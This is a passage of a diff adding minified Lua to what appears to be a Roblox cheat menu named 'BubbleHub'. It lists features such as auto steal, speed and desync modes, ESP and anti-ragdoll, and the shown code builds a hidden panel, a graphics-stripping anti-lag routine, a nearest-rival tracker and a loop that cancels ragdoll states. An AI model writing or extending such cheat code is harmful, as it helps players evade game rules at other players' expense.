+            _G.__BubbleSpeedValues.NormalSteal = N.NormalSteal;
+            _G.__BubbleSpeedValues.LaggerBoost = N.LaggerBoost;
+            _G.__BubbleSpeedValues.LaggerSteal = N.LaggerSteal;
+            _G.__BubbleSpeedValues.DesyncBoost = N.DesyncBoost;
+            _G.__BubbleSpeedValues.DesyncSteal = N.DesyncSteal;
+            b = {"Speed Boost", "auto steal", "Auto Carry Speed", "Inf Jump", "Unwalk", "Auto TP Down", "Anti Ragdoll", "Ragdoll Counter", "Medusa Counter", "Anti Die", "Anti Lag", "Optimizer", "ESP Players", "Player Tracers", "Stretchz Res", "Custom FOV", "Sky Changer", "Headless Visual", "Korblox Visual", "Show Buttons", "Lock Buttons", "Skin Changer", "Autoplay"};
+            for s, s in ipairs(b) do
+                q[s] = nil;
+            end;
+            mi();
+            if type(_G.__BubblePanelVisible) == "boolean" then
+                E["Toggle UI"] = _G.__BubblePanelVisible;
+            else
+                _G.__BubblePanelVisible = E["Toggle UI"] ~= false;
+                E["Toggle UI"] = _G.__BubblePanelVisible;
+            end;
+            if k ~= "v1" and k ~= "v2" then
+                k = "v1";
+            end;
+            _G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1;
+            _G.__tpBatV2Distance = math.clamp(tonumber(_G.__tpBatV2Distance) or 8, 0, 100);
+            _ = _ == "Normal" and "LaggerNormal" or (_ == "Lagger" and "LaggerCarry" or _);
+            J = _ == "LaggerCarry";
+            E["Speed Boost"] = _ ~= "Off";
+            O = E["Carry Speed"];
+            E["TP Bat"] = false;
+            E.Korblox = false;
+            pcall(function() local s = m.Character; if not s then return; end; for V, V in ipairs(s:GetChildren()) do if V.Name:find("^SkinChanger_") or V.Name == "Korblox_RightLeg" then V:Destroy(); end; end; local V = {"RightUpperLeg", "RightLowerLeg", "RightFoot"}; for F, L in ipairs(V) do F = s:FindFirstChild(L); if F and(F:IsA("BasePart")) then F.Transparency = 0; F.CanCollide = true; end; end; end);
+            E.Autoplay = false;
+            E.Lagger = false;
+            C = _G._BubbleHub_UI_MobileBtnPos or {};
+            _G.__BubbleModernGuiActive = true;
+            local s = game:GetService("CoreGui");
+            b = m.PlayerGui:FindFirstChild("BUBBLE_Panel") or(s:FindFirstChild("BUBBLE_Panel"));
+            if b then
+                b:Destroy();
+            end;
+            local V = Instance.new("ScreenGui");
+            V.Name = "BubbleHub";
+            V.Enabled = false;
+            V.ResetOnSpawn = false;
+            V.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+            V.DisplayOrder = 9999999;
+            V.IgnoreGuiInset = true;
+            pcall(function() V.Parent = s; end);
+            if not V.Parent then
+                V.Parent = m.PlayerGui;
+            end;
+            local s = workspace.CurrentCamera.ViewportSize;
+            GUI_METRICS = {sectionPad = A and 4 or 6, sectionGap = A and 4 or 6, sectionHeaderH = A and 16 or 20, toggleH = A and 44 or 62, compactRowH = A and 30 or 36, compactCardH = A and 28 or 32, toggleTextSize = A and 9 or 10, bindW = A and 34 or 40, bindH = A and 16 or 20, bindTextSize = A and 8 or 9};
+            local F, L, C = A and(math.clamp(math.floor(s.X * 0.42), 165, 205)) or(math.min(340, math.floor(s.X * 0.52))), A and(math.clamp(math.floor(s.Y * 0.52), 200, 310)) or(math.min(520, math.floor(s.Y * 0.8))), Instance.new("Frame");
+            C.Name = "Panel";
+            C.Active = true;
+            C.Size = UDim2.new(0, F, 0, L);
+            b = _G._BubbleHub_UI_MenuPos;
+            if b then
+                local ii, Qi = v(C, 0, b.x, 0, b.y);
+                C.Position = UDim2.new(0, ii, 0, Qi);
+            else
+                C.Position = UDim2.new(1,- F - 20, 0.5,- L / 2);
+            end;
+            C.BackgroundTransparency = 1;
+            C.BorderSizePixel = 0;
+            C.Visible = false;
+            C.Parent = V;
+            local ii = Instance.new("Frame");
+            ii.Name = "LegacyHeaderStub";
+            ii.BackgroundTransparency = 1;
+            ii.Visible = false;
+            ii.Parent = C;
+            T = Instance.new("TextLabel");
+            T.BackgroundTransparency = 1;
+            T.Visible = false;
+            T.Parent = ii;
+            l = Instance.new("TextLabel");
+            l.BackgroundTransparency = 1;
+            l.Visible = false;
+            l.Parent = ii;
+            local Qi = Instance.new("Frame");
+            Qi.Name = "LegacyContentStub";
+            Qi.BackgroundTransparency = 1;
+            Qi.Visible = false;
+            Qi.Parent = C;
+            local hi, Ai = {"rbxassetid://73150955404439", "rbxassetid://79480711823817", "rbxassetid://76378322235204", "rbxassetid://73544890303272"}, tonumber(_G._BubbleHub_UI_BgIndex) or 1;
+            local Hi, Ei = type(Ai) ~= "number" or Ai < 1;
+            if Hi then
+                Ei = Hi;
+            else
+                ii = #hi;
+                Ei = Ai > ii;
+            end;
+            if Ei then
+                Ai = 1;
+            end;
+            local si = Instance.new("ImageLabel");
+            si.Name = "LegacyBackgroundStub";
+            si.BackgroundTransparency = 1;
+            si.Image = hi[Ai];
+            si.Visible = false;
+            si.Parent = C;
+            local bi = Instance.new("TextButton");
+            bi.Name = "LegacyBackgroundButtonStub";
+            bi.Visible = false;
+            bi.Parent = C;
+            do
+                local Vi, Fi;
+                local Ni, Ii = false;
+                local function Pi(ki)
+                    pcall(function() if _G.__BubblePreserveOptimizerUI (ki) then return; end; local xi, _i = pcall(function() return ki:IsDescendantOf(game:GetService("Lighting")); end); if xi and _i then return; end; if ki:IsA("Sky") or(ki:IsA("Atmosphere")) or(ki:IsA("ColorCorrectionEffect")) or(ki:IsA("BloomEffect")) or(ki:IsA("BlurEffect")) or(ki:IsA("SunRaysEffect")) or(ki:IsA("DepthOfFieldEffect")) then return; end; _i, xi = pcall(function() local Li = ki; while Li and Li ~= workspace do if Li.Name == "Headless_Headless" or(Li.Name:find("^Korblox_")) then return true; end; Li = Li.Parent; end; return false; end); if _i and xi then return; end; if ki:IsA("Accessory") or(ki:IsA("Hat")) then ki:Destroy(); elseif ki:IsA("Shirt") or(ki:IsA("Pants")) or(ki:IsA("ShirtGraphic")) or(ki:IsA("BodyColors")) or(ki:IsA("CharacterMesh")) then ki:Destroy(); elseif ki:IsA("BasePart") then ki.Material = Enum.Material.Plastic; ki.Reflectance = 0; ki.CastShadow = false; elseif ki:IsA("Decal") or(ki:IsA("Texture")) then ki.Transparency = 1; elseif ki:IsA("ParticleEmitter") or(ki:IsA("Trail")) or(ki:IsA("Beam")) or(ki:IsA("Fire")) or(ki:IsA("Smoke")) or(ki:IsA("Sparkles")) then ki.Enabled = false; elseif ki:IsA("AnimationController") or(ki:IsA("Animator")) then _i = ki.Parent; while _i and _i ~= workspace do if _i:IsA("Model") and(K:GetPlayerFromCharacter(_i)) then return; end; _i = _i.Parent; end; for xi, xi in ipairs(ki:GetPlayingAnimationTracks()) do pcall(function() xi:Stop(0); end); end; end; end);
+                end;
+                local function ki()
+                    if Ii then
+                        Ii();
+                    end;
+                    Ii = _G.__BubbleWalkDescendantsBatched (workspace, Pi, function() return Ni; end);
+                end;
+                local function xi()
+                    if Ni then
+                        return;
+                    end;
+                    Ni = true;
+                    if Vi then
+                        Vi:Disconnect();
+                    end;
+                    Vi = workspace.DescendantAdded:Connect(function(_i) if Ni then Pi(_i); end; end);
+                    ki();
+                    if Fi then
+                        Fi:Disconnect();
+                    end;
+                    Fi = m.CharacterAdded:Connect(function(ki) task.wait(0.5); if Ni then _G.__BubbleWalkDescendantsBatched (ki, Pi, function() return Ni; end); end; end);
+                end;
+                local function Pi()
+                    if not Ni then
+                        return;
+                    end;
+                    Ni = false;
+                    if Ii then
+                        Ii();
+                        Ii = nil;
+                    end;
+                    if Vi then
+                        Vi:Disconnect();
+                        Vi = nil;
+                    end;
+                    if Fi then
+                        Fi:Disconnect();
+                        Fi = nil;
+                    end;
+                end;
+                _G.__refreshFPSBoost = xi;
+                _G.__stopFPSBoost = Pi;
+                W["FPS Boost"] = function(Vi)
+                    if Vi then
+                        xi();
+                    else
+                        Pi();
+                    end;
+                end;
+            end;
+            (function() local Vi, Fi, Ni, Ii, Pi, ki, xi = false, 0, {}, setmetatable({}, {__mode = "k"}), {}, setmetatable({}, {__mode = "k"}), setmetatable({}, {__mode = "k"}); local _i; local function Li(zi, Si, gi) pcall(function() local Oi = zi[Si]; if Oi == gi then return; end; zi[Si] = gi; local gi = Ii[zi]; if not gi then gi = {}; Ii[zi] = gi; end; if not gi[Si] then gi[Si] = {value = Oi}; end; end); end; local function zi(Si) local gi = m.Character; if gi and(Si == gi or(Si:IsDescendantOf(gi))) then return true; end; gi = Si; while gi and gi ~= workspace do if gi:IsA("LayerCollector") or(gi:IsA("GuiObject")) or(gi:IsA("GuiBase2d")) then return true; end; local Oi = gi.Name or ""; if Oi:match("^Bubble") or(Oi:match("^__Bubble")) or(Oi:match("^Bubble")) or(Oi:match("^ESP_")) or(Oi:match("^SkinChanger_")) or(Oi:match("^Korblox_")) or Oi == "Headless_Headless" or Oi == "GreenDuelsBB" or Oi == "PredictionSphere" then return true; end; gi = gi.Parent; end; if E["Sky Changer"] and(Si == Q or(Si:IsDescendantOf(Q))) then return true; end; return false; end; local function Si(gi) if ki[gi] then return; end; local Oi = m.Character; if Oi and(gi:IsDescendantOf(Oi)) then return; end; ki[gi] = true; local Oi = Fi; local ni, Ji = pcall(function() return gi.AnimationPlayed:Connect(function(fi) if not Vi or Fi ~= Oi then return; end; task.defer(function() if Vi and Fi == Oi then pcall(function() fi:Stop(0); end); end; end); end); end); if ni then table.insert(Ni, Ji); end; pcall(function() for Oi, Oi in ipairs(gi:GetPlayingAnimationTracks()) do if Oi.IsPlaying then xi[Oi] = {animator = gi, time = Oi.TimePosition, speed = Oi.Speed}; Oi:Stop(0); end; end; end); end; local function gi(Oi) if not Vi or(zi(Oi)) then return; end; if Oi:IsA("Terrain") then Li(Oi, "Decoration", false); Li(Oi, "WaterWaveSize", 0); Li(Oi, "WaterWaveSpeed", 0); Li(Oi, "WaterReflectance", 0); Li(Oi, "WaterTransparency", 1); end; if Oi:IsA("BasePart") then Li(Oi, "Material", Enum.Material.Plastic); Li(Oi, "MaterialVariant", ""); Li(Oi, "Reflectance", 0); Li(Oi, "CastShadow", false); if Oi:IsA("MeshPart") then Li(Oi, "TextureID", ""); Li(Oi, "RenderFidelity", Enum.RenderFidelity.Performance); Li(Oi, "DoubleSided", false); elseif Oi:IsA("PartOperation") then Li(Oi, "RenderFidelity", Enum.RenderFidelity.Performance); end; elseif Oi:IsA("SpecialMesh") then Li(Oi, "TextureId", ""); elseif Oi:IsA("SurfaceAppearance") then Pi[Oi] = true; Li(Oi, "Parent", nil); elseif Oi:IsA("Decal") or(Oi:IsA("Texture")) then Li(Oi, "Transparency", 1); Li(Oi, "Texture", ""); elseif Oi:IsA("ParticleEmitter") then Li(Oi, "Enabled", false); Li(Oi, "Rate", 0); pcall(function() Oi:Clear(); end); elseif Oi:IsA("Trail") then Li(Oi, "Enabled", false); pcall(function() Oi:Clear(); end); elseif Oi:IsA("Beam") or(Oi:IsA("Fire")) or(Oi:IsA("Smoke")) or(Oi:IsA("Sparkles")) or(Oi:IsA("Light")) or(Oi:IsA("PostEffect")) or(Oi:IsA("Clouds")) then Li(Oi, "Enabled", false); elseif Oi:IsA("Atmosphere") then Li(Oi, "Density", 0); Li(Oi, "Haze", 0); Li(Oi, "Glare", 0); elseif Oi:IsA("Sky") then local zi = {"SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp", "SunTextureId", "MoonTextureId"}; for ni, ni in ipairs(zi) do Li(Oi, ni, ""); end; Li(Oi, "StarCount", 0); Li(Oi, "CelestialBodiesShown", false); elseif Oi:IsA("Shirt") then Li(Oi, "ShirtTemplate", ""); elseif Oi:IsA("Pants") then Li(Oi, "PantsTemplate", ""); elseif Oi:IsA("ShirtGraphic") then Li(Oi, "Graphic", ""); elseif Oi:IsA("Animator") then Si(Oi); end; end; local function zi() if E["Sky Changer"] then return; end; Li(Q, "GlobalShadows", false); Li(Q, "EnvironmentDiffuseScale", 0); Li(Q, "EnvironmentSpecularScale", 0); Li(Q, "FogStart", 0); Li(Q, "FogEnd", 10000000000); end; local function Si() if not Vi then return; end; Vi = false; Fi += 1; if _i then _i (); _i = nil; end; for Oi, Oi in ipairs(Ni) do pcall(function() Oi:Disconnect(); end); end; Ni = {}; for Oi, ni in pairs(Ii) do for Ji, fi in pairs(ni) do pcall(function() Oi[Ji] = fi.value; end); end; end; Ii, Pi = setmetatable({}, {__mode = "k"}), {}; ki = setmetatable({}, {__mode = "k"}); for Ii, Pi in pairs(xi) do pcall(function() if Pi.animator.Parent and not Ii.IsPlaying then Ii:Play(0, 1, Pi.speed); Ii.TimePosition = Pi.time; end; end); end; xi = setmetatable({}, {__mode = "k"}); end; W["Anti Lag"] = function(Ii) if not Ii then Si(); return; end; if Vi then return; end; Vi = true; Fi += 1; local Pi = Fi; zi(); pcall(function() Li(settings().Rendering, "QualityLevel", Enum.QualityLevel.Level01); end); pcall(function() Li(UserSettings():GetService("UserGameSettings"), "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1); end); Ii = {workspace, Q}; for ki, ki in ipairs(Ii) do table.insert(Ni, ki.DescendantAdded:Connect(function(Ii) task.defer(function() if Vi and Fi == Pi then pcall(gi, Ii); end; end); end)); end; table.insert(Ni, Q.Changed:Connect(function(Ni) if Vi and(Ni == "GlobalShadows" or Ni == "EnvironmentDiffuseScale" or Ni == "EnvironmentSpecularScale" or Ni == "FogStart" or Ni == "FogEnd") then zi(); end; end)); if _i then _i (); end; _i = _G.__BubbleWalkDescendantsBatched ({workspace, Q}, gi, function() return Vi and Fi == Pi; end); end; _G.__BubbleTrackStopper (Si); end)();
+            do
+                local Vi, Fi, Ni, Ii = 0, 0, 0, 0;
+                local function Pi()
+                    local ki, xi = pcall(function() return m:GetNetworkPing() * 1000; end);
+                    if ki and type(xi) == "number" then
+                        return math.floor(xi);
+                    end;
+                    return 0;
+                end;
+                local function ki()
+                    if T then
+                        T.Text = tostring(Vi) .. " FPS";
+                    end;
+                    if l then
+                        l.Text = tostring(Fi) .. " MS";
+                    end;
+                    if Z then
+                        Z.Text = tostring(Vi) .. " FPS";
+                    end;
+                    if p then
+                        p.Text = tostring(Fi) .. " MS";
+                    end;
+                end;
+                Ni, Ii = 0, 0;
+                _G.__BubbleTrackConn (c.RenderStepped:Connect(function(xi) Ii += 1; Ni += xi; if Ni >= 1 then Vi, Ii, Ni = math.floor(Ii / Ni + 0.5), 0, 0; Fi = Pi(); ki(); end; end));
+            end;
+            do
+                local Vi;
+                local Fi, Ni, Ii = false;
+                local Pi = _G._BubbleHub_UI_EnemyWidgetPos or {x = 140, y =- 340};
+                function _G.__BubbleGuiPositionResetters.EnemyWidget()
+                    Fi, Pi = false, {x = 140, y =- 340};
+                    _G._BubbleHub_UI_EnemyWidgetPos = nil;
+                    if Vi and Vi.Parent then
+                        Vi.Position = UDim2.fromOffset(Pi.x, Pi.y);
+                    end;
+                end;
+                local ki, xi, _i = 0;
+                local Li, zi, Si = false;
+                local gi, Oi = "";
+                function _G.__BubbleGetVisualEnemy ()
+                    if xi and xi.Parent == K then
+                        return xi;
+                    end;
+                    return nil;
+                end;
+                local function ni()
+                    if Vi and Vi.Parent then
+                        return Vi;
+                    end;
+                    Vi = Instance.new("Frame", V);
+                    Vi.Name = "BubbleEnemyWidget";
+                    Vi.Size = UDim2.new(0, 140, 0, 80);
+                    Vi.Position = UDim2.new(0, Pi.x, 0, Pi.y);
+                    _G.__enemyWidget = Vi;
+                    _G.__BubbleRegisterThemeRoot (Vi);
+                    Vi.BackgroundTransparency = 0.15;
+                    Vi.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
+                    Vi.ZIndex = 600;
+                    Vi.Visible = false;
+                    Instance.new("UICorner", Vi).CornerRadius = UDim.new(0, 8);
+                    local Ji = Instance.new("UIStroke", Vi);
+                    Ji.Color = Color3.fromRGB(0, 0, 0);
+                    Ji.Thickness = 1;
+                    Ji = Instance.new("TextLabel", Vi);
+                    Ji.Name = "EWTitle";
+                    Ji.Size = UDim2.new(1,- 10, 0, 14);
+                    Ji.Position = UDim2.new(0, 8, 0, 4);
+                    Ji.BackgroundTransparency = 1;
+                    Ji.Text = "RIVAL";
+                    Ji.Font = Enum.Font.GothamBold;
+                    Ji.TextSize = 10;
+                    Ji.TextColor3 = Color3.fromRGB(180, 180, 180);
+                    Ji.TextXAlignment = Enum.TextXAlignment.Left;
+                    Ji.ZIndex = 601;
+                    Ji = Instance.new("ImageLabel", Vi);
+                    Ji.Name = "EWAvatar";
+                    Ji.Size = UDim2.new(0, 44, 0, 44);
+                    Ji.Position = UDim2.new(0, 6, 0, 20);
+                    Ji.BackgroundColor3 = Color3.fromRGB(25, 25, 25);
+                    Ji.BorderSizePixel = 0;
+                    Ji.Image = "";
+                    Ji.ZIndex = 601;
+                    Instance.new("UICorner", Ji).CornerRadius = UDim.new(0, 6);
+                    local fi = Instance.new("UIStroke", Ji);
+                    fi.Color = Color3.fromRGB(180, 180, 180);
+                    fi.Thickness = 1;
+                    fi = Instance.new("TextLabel", Vi);
+                    fi.Name = "EWName";
+                    fi.Size = UDim2.new(1,- 60, 0, 18);
+                    fi.Position = UDim2.new(0, 56, 0, 22);
+                    fi.BackgroundTransparency = 1;
+                    fi.Text = "---";
+                    fi.Font = Enum.Font.GothamBold;
+                    fi.TextSize = 13;
+                    fi.TextColor3 = Color3.fromRGB(180, 180, 180);
+                    fi.TextXAlignment = Enum.TextXAlignment.Left;
+                    fi.TextScaled = false;
+                    fi = Instance.new("TextLabel", Vi);
+                    fi.Name = "EWTimer";
+                    fi.Size = UDim2.new(1,- 60, 0, 20);
+                    fi.Position = UDim2.new(0, 56, 0, 44);
+                    fi.BackgroundTransparency = 1;
+                    fi.Text = "";
+                    fi.Font = Enum.Font.GothamBlack;
+                    fi.TextSize = 16;
+                    fi.TextColor3 = Color3.fromRGB(255, 221, 0);
+                    fi.TextXAlignment = Enum.TextXAlignment.Left;
+                    fi.ZIndex = 601;
+                    Vi.InputBegan:Connect(function(Ji) if Ji.UserInputType == Enum.UserInputType.MouseButton1 or Ji.UserInputType == Enum.UserInputType.Touch then Fi = true; Ni = Ji.Position; Ii = Vi.Position; Ji.Changed:Connect(function() if Ji.UserInputState == Enum.UserInputState.End then Fi = false; Pi.x = Vi.Position.X.Offset; Pi.y = Vi.Position.Y.Offset; _G._BubbleHub_UI_EnemyWidgetPos = {x = Pi.x, y = Pi.y}; mi(); end; end); end; end);
+                    _G.__BubbleTrackConn (R.InputChanged:Connect(function(Ji) if not Fi then return; end; if Ji.UserInputType ~= Enum.UserInputType.MouseMovement and Ji.UserInputType ~= Enum.UserInputType.Touch then return; end; local Fi, fi = Ji.Position - Ni, workspace.CurrentCamera.ViewportSize; local Ni, Ji = math.clamp(Ii.X.Offset + Fi.X, 0, fi.X - Vi.AbsoluteSize.X), math.clamp(Ii.Y.Offset + Fi.Y, 0, fi.Y - Vi.AbsoluteSize.Y); Vi.Position = UDim2.new(0, Ni, 0, Ji); end));
+                    return Vi;
+                end;
+                local function Fi(Ni)
+                    local Ii = ni():FindFirstChild("EWAvatar");
+                    if not Ii then
+                        return;
+                    end;
+                    Ii.Image = "";
+                    task.spawn(function() local Ji, fi = pcall(function() return K:GetUserThumbnailAsync(Ni, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48); end); if Ji and fi and Ii and Ii.Parent then Ii.Image = fi; end; end);
+                end;
+                local function Ni(Ii)
+                    if Ii and xi and Ii.UserId == _i then
+                        return;
+                    end;
+                    if not Ii and not xi then
+                        return;
+                    end;
+                    xi, Li, Si = Ii, false, nil;
+                    local Ji = ni();
+                    local fi = Ji:FindFirstChild("EWName");
+                    zi = Ji:FindFirstChild("EWTimer");
+                    if Ii then
+                        _i = Ii.UserId;
+                        if fi then
+                            fi.Text = Ii.Name;
+                        end;
+                        if zi then
+                            zi.Text = "";
+                            gi = "";
+                        end;
+                        Fi(Ii.UserId);
+                        Ji.Visible = true;
+                        Oi = true;
+                    else
+                        _i = nil;
+                        if fi then
+                            fi.Text = "---";
+                        end;
+                        if zi then
+                            zi.Text = "";
+                            gi = "";
+                        end;
+                        local Fi = Ji:FindFirstChild("EWAvatar");
+                        if Fi then
+                            Fi.Image = "";
+                        end;
+                        Ji.Visible = false;
+                        Oi = false;
+                    end;
+                end;
+                local function Fi(Ii)
+                    local _i = ki;
+                    if _i > 0 then
+                        ki = math.max(0, ki - Ii);
+                    end;
+                    Ii = zi;
+                    if not Ii or not Ii.Parent then
+                        return;
+                    end;
+                    if ki > 0 then
+                        _i = string.format("%.1fs", ki);
+                        if _i ~= gi then
+                            Ii.Text = _i;
+                            Ii.TextColor3 = Color3.fromRGB(255, 221, 0);
+                            gi = _i;
+                        end;
+                    elseif gi ~= "" then
+                        Ii.Text = "";
+                        gi = "";
+                    end;
+                end;
+                local Ii, _i, zi = 0, A and 0.5 or 0.25, 0;
+                _G.__BubbleTrackConn (c.Heartbeat:Connect(function(gi) zi += gi or 0; if xi and zi >= 0.2 then Fi(zi); zi = 0; else gi = not xi and zi >= 0.2; if gi then zi = 0; end; end; gi = os.clock(); if gi - Ii < _i then return; end; Ii = gi; gi = m.Character; local Fi = gi and(gi:FindFirstChild("HumanoidRootPart")); if not Fi then return; end; local Ii, _i, zi = Fi.Position, math.huge; for Ji, fi in ipairs(K:GetPlayers()) do gi = fi ~= m and fi.Character; if gi then Fi = gi:FindFirstChild("HumanoidRootPart"); if Fi then Ji = Fi.Position; local oi, qi, Bi = Ii.X - Ji.X, Ii.Y - Ji.Y, Ii.Z - Ji.Z; local Ji = oi * oi + qi * qi + Bi * Bi; if Ji < _i then _i, zi = Ji, fi; end; end; end; end; if zi ~= xi then Ni(zi); end; Fi = Vi; if Fi and Fi.Parent then Ii = zi ~= nil; if Ii ~= Oi then Fi.Visible = Ii; Oi = Ii; end; end; if xi then _i = Fi and(Fi:FindFirstChild("EWName")); if _i then if xi:GetAttribute("Stealing") == true then _i.TextColor3 = Color3.fromRGB(255, 60, 60); else _i.TextColor3 = Color3.fromRGB(180, 180, 180); end; end; end; if xi and xi.Character then Fi = not Si or not Si.Parent; if Fi then Si = xi.Character:FindFirstChildOfClass("Humanoid"); end; if Si then zi = Si:GetState(); Ii = zi == Enum.HumanoidStateType.Physics or zi == Enum.HumanoidStateType.Ragdoll or zi == Enum.HumanoidStateType.FallingDown; _i = Ii and not Li; if _i then ki = 3; else gi = Ii and ki < 0.5; if gi then ki = 0.5; end; end; Li = Ii; end; end; end));
+                function _G._BubbleHub_EnemyWidget_SaveHook ()
+                    if Vi and Vi.Parent then
+                        Pi.x = Vi.Position.X.Offset;
+                        Pi.y = Vi.Position.Y.Offset;
+                        _G._BubbleHub_UI_EnemyWidgetPos = {x = Pi.x, y = Pi.y};
+                    end;
+                end;
+                ni();
+            end;
+            local function Vi(Fi, Ni)
+                local Ii = Instance.new("Frame");
+                Ii.Name = (Ni and(tostring(Ni)) or "Section") .. "SectionStub";
+                Ii.BackgroundTransparency = 1;
+                Ii.Visible = false;
+                Ii.Parent = Fi;
+                return Ii;
+            end;
+            local function Fi(Ni, Ii, Pi, ki)
+                local xi = Instance.new("Frame");
+                xi.Name = tostring(Pi or Ii or "Toggle") .. "Stub";
+                xi.BackgroundTransparency = 1;
+                xi.Visible = false;
+                xi.Parent = Ni;
+                if ki then
+                    Ni = Instance.new("TextButton");
+                    Ni.Text = "";
+                    Ni.Parent = xi;
+                    Ii = Instance.new("Frame");
+                    Ii.BackgroundTransparency = 1;
+                    Ii.Parent = xi;
+                    ki(Ii);
+                end;
+                return xi;
+            end;
+            local function Ni(Ii, Pi, ki)
+                local xi = Instance.new("Frame");
+                xi.Name = tostring(ki or Pi or "Toggle") .. "Stub";
+                xi.BackgroundTransparency = 1;
+                xi.Visible = false;
+                xi.Parent = Ii;
+                return xi;
+            end;
+            local function Ii(Pi)
+                -- Explicitly activate the requested mode every time, including when it is already selected.
+                -- Do not use the old same-mode carry-direction toggle here.
+                Pi = (Pi == "Off" or Pi == "LaggerNormal" or Pi == "LaggerCarry" or Pi == "Normal" or Pi == "Lagger" or Pi == "Desync") and Pi or "Off";
+                -- Clicking an active mode turns it off; Off is the true default speed.
+                if _ == Pi then Pi = "Off"; end;
+                _ = Pi;
+                J = (Pi == "LaggerCarry" or Pi == "Lagger");
+                E["Speed Boost"] = true;
+                if n == "v2" then
+                    O = true;
+                    E["Carry Speed"] = true;
+                    if U["Carry Speed"] then pcall(U["Carry Speed"]); end;
+                end;
+                if _G.__BubbleResetSpeedDirection then pcall(_G.__BubbleResetSpeedDirection); end;
+                if _G.__refreshSpeedBoost then pcall(_G.__refreshSpeedBoost); end;
+                for _, speedCard in ipairs(_speedCardRefs or {}) do
+                    if speedCard.updateVisual then pcall(speedCard.updateVisual); end;
+                end;
+                mi();
+                pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards(); end; end);
+            end;
+                FeatureToggles = FeatureToggles or {};
+                function FeatureToggles.SelectDefaultMode()
+                    Ii("Off");
+                end;
+                function FeatureToggles.SelectNormalMode()
+                    Ii("LaggerNormal");
+                end;
+                function FeatureToggles.SelectLaggerMode()
+                    Ii("LaggerCarry");
+                end;
+                function FeatureToggles.SelectDesyncMode()
+                    Ii("Desync");
+                end;
+                FeatureToggles["Toggle UI"] = function()
+                    if _G.__setPanelVisible then
+                        _G.__setPanelVisible (not C.Visible);
+                    else
+                        panelVisible = not C.Visible;
+                        C.Visible = panelVisible;
+                        E["Toggle UI"] = panelVisible;
+                    end;
+                    if U["Toggle UI"] then
+                        U["Toggle UI"]();
+                    end;
+                    mi();
+                end;
+                local function Pi()
+                    if _ == "Off" then return N.NormalBoost or z; end;
+                    if _ == "LaggerNormal" then return N.LaggerBoost or g; end;
+                    if _ == "LaggerCarry" or _ == "Lagger" or J then
+                        return N.LaggerSteal or S;
+                    elseif _ == "Desync" then
+                        return N.DesyncBoost or z;
+                    end;
+                    for ki, ki in ipairs(I) do
+                        if _ == ki.name then
+                            return ki.boost;
+                        end;
+                    end;
+                    return N.NormalBoost or z;
+                end;
+                local ki = {Enabled = false, Connection = nil, ResetCooldown = 0};
+                local function xi()
+                    if ki.Connection then
+                        return;
+                    end;
+                    ki.Enabled = true;
+                    ki.Connection = c.Heartbeat:Connect(function() if not E["Anti Ragdoll"] then return; end; local _i = m.Character; if not _i then return; end; local Li, zi = _i:FindFirstChildOfClass("Humanoid"), _i:FindFirstChild("HumanoidRootPart"); if not Li or not zi or Li.Health <= 0 then return; end; if _G.dropActive then return; end; local Si, gi = Li:GetState(), tick(); if Si == Enum.HumanoidStateType.Physics or Si == Enum.HumanoidStateType.Ragdoll or Si == Enum.HumanoidStateType.FallingDown then if gi - ki.ResetCooldown > 0.15 then ki.ResetCooldown = gi; pcall(function() Li:ChangeState(Enum.HumanoidStateType.GettingUp); zi.Velocity = Vector3.zero; zi.RotVelocity = Vector3.zero; zi.AssemblyLinearVelocity = Vector3.zero; zi.AssemblyAngularVelocity = Vector3.zero; for zi, zi in ipairs(_i:GetDescendants()) do if zi:IsA("Motor6D") then zi.Enabled = true; end; if zi:IsA("Constraint") then zi.Enabled = true; end; end; workspace.CurrentCamera.CameraSubject = Li; local _i = m.PlayerScripts:FindFirstChild("PlayerModule"); if _i then local zi = require(_i:FindFirstChild("ControlModule")); if zi then zi:Enable(); end; end; Li.AutoRotate = true; Li.PlatformStand = false; Li.Sit = false; end); end; end; end);
+                end;
+                local function _i ()
+                    ki.Enabled = false;
+                    if ki.Connection then
+                        ki.Connection:Disconnect();
+                        ki.Connection = nil;
+                    end;
+                end;
+                _G.__BubbleTrackStopper (_i);
+                W["Anti Ragdoll"] = function(Li)
+                    if Li then
+                        xi();
+                    else
+                        _i ();
+                    end;
+                end;
+                _G.__BubbleTrackConn (m.CharacterAdded:Connect(function(_i) task.wait(0.5); if E["Anti Ragdoll"] then if ki.Connection then ki.Connection:Disconnect(); ki.Connection = nil; end; xi(); end; end));
+                if E["Anti Ragdoll"] then
+                    xi();
+                end;
+                do
+                    local ki = {Connection = nil, RagdollConnection = nil};
+                    local function xi()
+                        if ki.Connection then
+                            ki.Connection:Disconnect();
+                            ki.Connection = nil;
+                        end;
+                        if ki.RagdollConnection then
+                            ki.RagdollConnection:Disconnect();
+                            ki.RagdollConnection = nil;
+                        end;
+                    end;
+                    local function _i ()
+                        local Li = m.Character;
+                        local zi = Li and(Li:FindFirstChild("HumanoidRootPart"));
+                        if not zi then
+                            return;
+                        end;
+                        if ki.Connection then
+                            ki.Connection:Disconnect();
+                        end;
+                        ki.Connection = c.Heartbeat:Connect(function()
+                        if not E["Anti Bat"] or not zi.Parent then return; end;
+                        local char = m.Character;
+                        local hum = char and char:FindFirstChildOfClass("Humanoid");
+                        if hum and hum.Health > 0 then
+                            local st = hum:GetState();
+                            if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown then
+                                hum:ChangeState(Enum.HumanoidStateType.GettingUp);
+                                hum:ChangeState(Enum.HumanoidStateType.Running);
+                            end;
+                        end;
+                    end);
+                    end;
+                    local function Li()
+                        if ki.RagdollConnection then
+                            return;
+                        end;
